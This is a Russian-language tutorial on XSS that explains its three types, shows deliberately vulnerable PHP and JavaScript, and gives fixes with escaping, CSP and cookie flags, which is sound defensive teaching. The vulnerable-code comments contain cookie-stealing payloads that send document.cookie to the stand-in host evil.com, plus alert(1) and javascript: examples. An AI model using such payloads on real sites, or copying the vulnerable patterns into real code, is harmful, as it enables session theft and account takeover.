## Вопрос: XSS (Cross-Site Scripting)

## Простой ответ
- Не доверяйте пользовательскому вводу при выводе в HTML/JS. Экранируйте контекстно, ставьте HttpOnly/SameSite на куки и CSP.

## Ответ

### Что такое XSS

XSS (Cross-Site Scripting) — это атака, при которой злоумышленник внедряет вредоносный JavaScript-код в веб-страницу, которую просматривает другой пользователь. Скрипт выполняется в контексте браузера жертвы с полными правами этого сайта: доступ к cookies, DOM, localStorage, возможность отправлять запросы от имени пользователя. XSS — одна из самых распространённых уязвимостей веба, входит в OWASP Top 10.

### Типы XSS

**Reflected XSS (отражённый)** — вредоносный скрипт передаётся через URL или параметр запроса и отражается в ответе сервера. Жертве отправляют специально сформированную ссылку. Пример: поиск на сайте, где введённый текст отображается на странице без экранирования.

**Stored XSS (хранимый)** — самый опасный тип. Вредоносный скрипт сохраняется в базе данных (комментарий, пост, профиль) и выполняется у каждого посетителя страницы. Не требует взаимодействия жертвы со специальной ссылкой.

**DOM-based XSS** — уязвимость возникает полностью на клиентской стороне. JavaScript-код на странице берёт данные из небезопасного источника (location.hash, document.referrer) и вставляет их в DOM без экранирования. Серверная сторона может быть полностью безопасной.

### Уязвимый код (PHP)

```php
// УЯЗВИМО — Reflected XSS
// URL: /search?q=<script>document.location='https://evil.com/?c='+document.cookie</script>
$query = $_GET['q'];
echo "<h2>Результаты поиска: $query</h2>";

// УЯЗВИМО — Stored XSS (комментарии)
$comment = $_POST['comment']; // Содержит: <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
$pdo->prepare('INSERT INTO comments (body) VALUES (:body)')->execute(['body' => $comment]);

// При выводе:
$comments = $pdo->query('SELECT body FROM comments')->fetchAll();
foreach ($comments as $c) {
    echo "<div class='comment'>{$c['body']}</div>"; // XSS у каждого посетителя
}
```

```html
<!-- УЯЗВИМО — DOM-based XSS -->
<script>
  // URL: /page#<img src=x onerror=alert(1)>
  document.getElementById('output').innerHTML = location.hash.substring(1);
</script>
```

### Исправленный код (PHP)

```php
// БЕЗОПАСНО — контекстное экранирование для HTML
$query = $_GET['q'];
echo "<h2>Результаты поиска: " . htmlspecialchars($query, ENT_QUOTES, 'UTF-8') . "</h2>";

// БЕЗОПАСНО — экранирование при выводе комментариев
foreach ($comments as $c) {
    echo "<div class='comment'>" . htmlspecialchars($c['body'], ENT_QUOTES, 'UTF-8') . "</div>";
}

// БЕЗОПАСНО — вывод пользовательских данных в JavaScript контексте
$userData = ['name' => $userName, 'role' => $userRole];
echo '<script>var user = ' . json_encode($userData, JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT) . ';</script>';

// БЕЗОПАСНО — экранирование для атрибутов HTML
echo '<a href="/profile?id=' . urlencode($userId) . '">Профиль</a>';

// БЕЗОПАСНО — для URL в href/src (проверка протокола)
$url = $_GET['redirect'];
if (!preg_match('/^https?:\/\//', $url)) {
    $url = '/'; // fallback на безопасный URL
}
echo '<a href="' . htmlspecialchars($url, ENT_QUOTES, 'UTF-8') . '">Ссылка</a>';
```

### Что может сделать атакующий через XSS

Последствия XSS крайне серьёзные. Атакующий может: украсть session cookies и полностью захватить аккаунт; внедрить keylogger и перехватывать пароли/данные карт; перенаправить пользователя на фишинговую страницу; изменить содержимое страницы (defacement); выполнить действия от имени пользователя (перевод денег, смена пароля); распространить worm (Stored XSS, который сам себя копирует — пример: Samy worm на MySpace в 2005 году).

### Контексты экранирования

Критически важно понимать, что экранирование зависит от контекста. `htmlspecialchars()` защищает только HTML-контекст. Для JavaScript-контекста нужен `json_encode()` с флагами. Для URL-параметров — `urlencode()`. Для CSS — отдельное экранирование. Для HTML-атрибутов без кавычек — экранирование недостаточно, всегда оборачивайте значения атрибутов в кавычки. Использование неправильного экранирования для контекста — частая причина обхода защиты.

### Меры защиты

1. **Контекстное экранирование вывода** — основной метод. `htmlspecialchars()` с `ENT_QUOTES` и `UTF-8` для HTML. В шаблонизаторах (Blade, Twig) используйте auto-escaping (`{{ $var }}` в Blade, `{{ var }}` в Twig).
2. **Content Security Policy (CSP)** — HTTP-заголовок, ограничивающий источники скриптов. `Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'`. Запрещает inline-скрипты и eval по умолчанию.
3. **HttpOnly cookies** — куки с флагом `HttpOnly` недоступны из JavaScript (`document.cookie`), что предотвращает кражу сессии при XSS.
4. **SameSite cookies** — `SameSite=Strict` или `SameSite=Lax` ограничивает отправку cookies на cross-origin запросы.
5. **Санитизация HTML** — если нужно разрешить пользователю ввод HTML (WYSIWYG-редактор), используйте библиотеки типа HTML Purifier для PHP. Никогда не пишите свой парсер.
6. **Trusted Types (браузерный API)** — предотвращает DOM-based XSS, запрещая присвоение строк в опасные sink-и (innerHTML, eval и т.д.).

```php
// Установка защитных заголовков в PHP
header("Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'");
header("X-Content-Type-Options: nosniff");

// Безопасная настройка cookies сессии
session_set_cookie_params([
    'lifetime' => 3600,
    'path' => '/',
    'domain' => 'example.com',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Lax',
]);
```

### Практические советы

- Используйте шаблонизаторы с auto-escaping по умолчанию (Blade `{{ }}`, Twig `{{ }}`). Сырой вывод (`{!! !!}` в Blade, `{{ var|raw }}` в Twig) — только после явной санитизации.
- Никогда не вставляйте пользовательские данные в `<script>`, `onclick`, `onerror` и подобные контексты напрямую.
- Валидируйте URL-ы пользователей: `javascript:alert(1)` в `href` — это тоже XSS.
- Регулярно сканируйте приложение инструментами: Burp Suite, OWASP ZAP, Semgrep.
- CSP — это defence in depth. Даже с идеальным экранированием, CSP блокирует эксплуатацию пропущенных уязвимостей.

## Примеры

1. Stored XSS: комментарий с `<script>alert(1)</script>`.
2. Reflected XSS: параметр `q` сразу выводится в шаблон.
3. Защита: `htmlspecialchars`/auto‑escape + CSP.

## Доп. теория

1. Auto‑escape в шаблонах — основной барьер от XSS.
2. CSP снижает риск даже при уязвимом коде.
